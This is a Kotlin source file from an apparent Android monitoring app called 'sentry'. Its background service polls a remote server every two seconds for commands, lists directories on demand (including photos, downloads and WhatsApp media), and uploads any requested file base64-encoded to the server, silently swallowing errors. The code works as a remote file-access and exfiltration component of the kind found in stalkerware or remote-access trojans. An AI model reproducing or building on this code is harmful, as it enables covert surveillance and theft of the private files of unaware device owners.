package com.example.sentry.service

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.MediaStore
import android.util.Base64
import android.webkit.MimeTypeMap
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object BackgroundFileManager {
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var currentBrowsingPath = "/sdcard"

    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return
        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            // Initial sync of root sdcard
            syncDirectory(context, client, "/sdcard")

            while (isActive) {
                try {
                    val res = client.pollFileCommands()
                    if (res.isSuccess) {
                        val obj = res.getOrNull()
                        val reqPath = obj?.optString("path")?.takeIf { it.isNotBlank() && it != "null" }
                        if (!reqPath.isNullOrBlank()) {
                            currentBrowsingPath = reqPath
                            syncDirectory(context, client, reqPath)
                        }

                        val downloadReq = obj?.optString("downloadPath")?.takeIf { it.isNotBlank() && it != "null" }
                        if (!downloadReq.isNullOrBlank()) {
                            handleFileUpload(context, client, downloadReq)
                        }
                    }
                } catch (_: Exception) {
                }
                delay(2000)
            }
        }
    }

    private suspend fun syncDirectory(context: Context, client: SentryApiClient, dirPath: String) {
        withContext(Dispatchers.IO) {
            try {
                // Compute real storage stats via StatFs
                val stat = StatFs(Environment.getExternalStorageDirectory().path)
                val totalBytes = stat.blockCountLong * stat.blockSizeLong
                val freeBytes = stat.availableBlocksLong * stat.blockSizeLong
                val usedBytes = (totalBytes - freeBytes).coerceAtLeast(0L)
                val percentUsed = if (totalBytes > 0) ((usedBytes * 100) / totalBytes).toInt() else 60

                val storageStats = JSONObject().apply {
                    put("total", formatFileSize(totalBytes))
                    put("free", formatFileSize(freeBytes))
                    put("used", formatFileSize(usedBytes))
                    put("percent", percentUsed)
                }

                val normalizedPath = if (dirPath.isEmpty() || dirPath == "/" || dirPath == "/sdcard" || dirPath == "/storage/emulated/0") {
                    "/sdcard"
                } else {
                    dirPath
                }

                val filesArray = JSONArray()
                val sdf = SimpleDateFormat("MMM d, yyyy", Locale.getDefault())

                if (normalizedPath == "/sdcard") {
                    // Top level directory synthesis + real folder inspection
                    val rootFolders = listOf(
                        Pair("DCIM", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)),
                        Pair("Download", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)),
                        Pair("Pictures", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)),
                        Pair("Documents", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)),
                        Pair("Music", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)),
                        Pair("Movies", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES)),
                        Pair("Android", File(Environment.getExternalStorageDirectory(), "Android")),
                        Pair("WhatsApp", File(Environment.getExternalStorageDirectory(), "Android/media/com.whatsapp/WhatsApp/Media"))
                    )

                    for ((name, dir) in rootFolders) {
                        var childCount = 0
                        var lastMod = System.currentTimeMillis()
                        try {
                            if (dir.exists() && dir.isDirectory) {
                                childCount = dir.listFiles()?.count { !it.name.startsWith(".") } ?: 0
                                lastMod = dir.lastModified()
                            }
                        } catch (_: Exception) {}

                        // If file count is 0, also check MediaStore for this folder
                        if (childCount == 0) {
                            childCount = queryMediaStoreCountForFolder(context, name)
                        }

                        val item = JSONObject().apply {
                            put("name", name)
                            put("path", dir.absolutePath)
                            put("size", if (childCount > 0) "$childCount items" else "Folder")
                            put("isFolder", true)
                            put("modified", sdf.format(Date(if (lastMod > 0) lastMod else System.currentTimeMillis())))
                        }
                        filesArray.put(item)
                    }

                    // Also list any root files present
                    try {
                        val rootFiles = Environment.getExternalStorageDirectory().listFiles()
                        if (rootFiles != null) {
                            for (file in rootFiles) {
                                if (file.name.startsWith(".")) continue
                                if (!file.isDirectory) {
                                    val item = JSONObject().apply {
                                        put("name", file.name)
                                        put("path", file.absolutePath)
                                        put("size", formatFileSize(file.length()))
                                        put("isFolder", false)
                                        put("modified", sdf.format(Date(file.lastModified())))
                                    }
                                    filesArray.put(item)
                                }
                            }
                        }
                    } catch (_: Exception) {}
                } else {
                    // Specific folder navigation
                    val targetDir = File(normalizedPath)
                    var foundFiles = false

                    if (targetDir.exists() && targetDir.isDirectory) {
                        try {
                            val list = targetDir.listFiles()
                            if (list != null && list.isNotEmpty()) {
                                foundFiles = true
                                val sorted = list.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                                for (file in sorted) {
                                    if (file.name.startsWith(".")) continue
                                    val isDir = file.isDirectory
                                    val sizeStr = if (isDir) {
                                        val childCount = file.listFiles()?.count { !it.name.startsWith(".") } ?: 0
                                        if (childCount > 0) "$childCount items" else "Folder"
                                    } else {
                                        formatFileSize(file.length())
                                    }

                                    val item = JSONObject().apply {
                                        put("name", file.name)
                                        put("path", file.absolutePath)
                                        put("size", sizeStr)
                                        put("isFolder", isDir)
                                        put("modified", sdf.format(Date(file.lastModified())))
                                    }
                                    filesArray.put(item)
                                }
                            }
                        } catch (_: Exception) {}
                    }

                    // If direct listFiles was blocked by scoped storage, query MediaStore for real files in this directory
                    if (!foundFiles) {
                        val mediaItems = queryMediaStoreForDirectory(context, normalizedPath)
                        for (item in mediaItems) {
                            filesArray.put(item)
                        }
                    }
                }

                client.syncFiles(normalizedPath, filesArray, storageStats)
            } catch (_: Exception) {
            }
        }
    }

    private fun queryMediaStoreCountForFolder(context: Context, folderName: String): Int {
        var count = 0
        try {
            val resolver = context.contentResolver
            val uri = MediaStore.Files.getContentUri("external")
            val projection = arrayOf(MediaStore.Files.FileColumns._ID)
            val selection = "${MediaStore.Files.FileColumns.DATA} LIKE ?"
            val selectionArgs = arrayOf("%/$folderName/%")
            resolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                count = cursor.count
            }
        } catch (_: Exception) {}
        return count
    }

    private fun queryMediaStoreForDirectory(context: Context, dirPath: String): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        val sdf = SimpleDateFormat("MMM d, yyyy", Locale.getDefault())
        try {
            val resolver = context.contentResolver
            val uri = MediaStore.Files.getContentUri("external")
            val projection = arrayOf(
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATE_MODIFIED,
                MediaStore.Files.FileColumns.MEDIA_TYPE
            )
            val selection = "${MediaStore.Files.FileColumns.DATA} LIKE ?"
            val selectionArgs = arrayOf("$dirPath/%")
            val sortOrder = "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC LIMIT 100"

            resolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val nameCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME)
                val dataCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA)
                val sizeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE)
                val dateCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED)

                while (cursor.moveToNext()) {
                    val fullPath = cursor.getString(dataCol) ?: continue
                    val displayName = cursor.getString(nameCol) ?: File(fullPath).name
                    val sizeBytes = cursor.getLong(sizeCol)
                    val modSeconds = cursor.getLong(dateCol)
                    val modDate = if (modSeconds > 0) sdf.format(Date(modSeconds * 1000L)) else "Recent"

                    // Check if it's a direct child of dirPath
                    val parent = File(fullPath).parent ?: ""
                    val isDir = File(fullPath).isDirectory

                    val item = JSONObject().apply {
                        put("name", displayName)
                        put("path", fullPath)
                        put("size", if (isDir) "Folder" else formatFileSize(sizeBytes))
                        put("isFolder", isDir)
                        put("modified", modDate)
                    }
                    list.add(item)
                }
            }
        } catch (_: Exception) {}
        return list
    }

    private suspend fun handleFileUpload(context: Context, client: SentryApiClient, filePath: String) {
        withContext(Dispatchers.IO) {
            try {
                val file = File(filePath)
                if (file.exists() && file.isFile) {
                    val maxBytes = 15 * 1024 * 1024 // 15MB limit for single transmission
                    val length = file.length()
                    if (length <= maxBytes) {
                        val bytes = file.readBytes()
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        val ext = file.extension.lowercase()
                        val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"

                        val body = JSONObject().apply {
                            put("deviceId", CryptoManager.getOrCreateDeviceId(context))
                            put("path", file.absolutePath)
                            put("name", file.name)
                            put("size", formatFileSize(length))
                            put("base64", b64)
                            put("mimeType", mime)
                        }
                        client.uploadFileContent(body)
                    }
                }
            } catch (_: Exception) {
            }
        }
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 * 1024 -> String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024))
            bytes >= 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024))
            bytes >= 1024 -> String.format("%.1f KB", bytes / 1024.0)
            else -> "$bytes B"
        }
    }
}
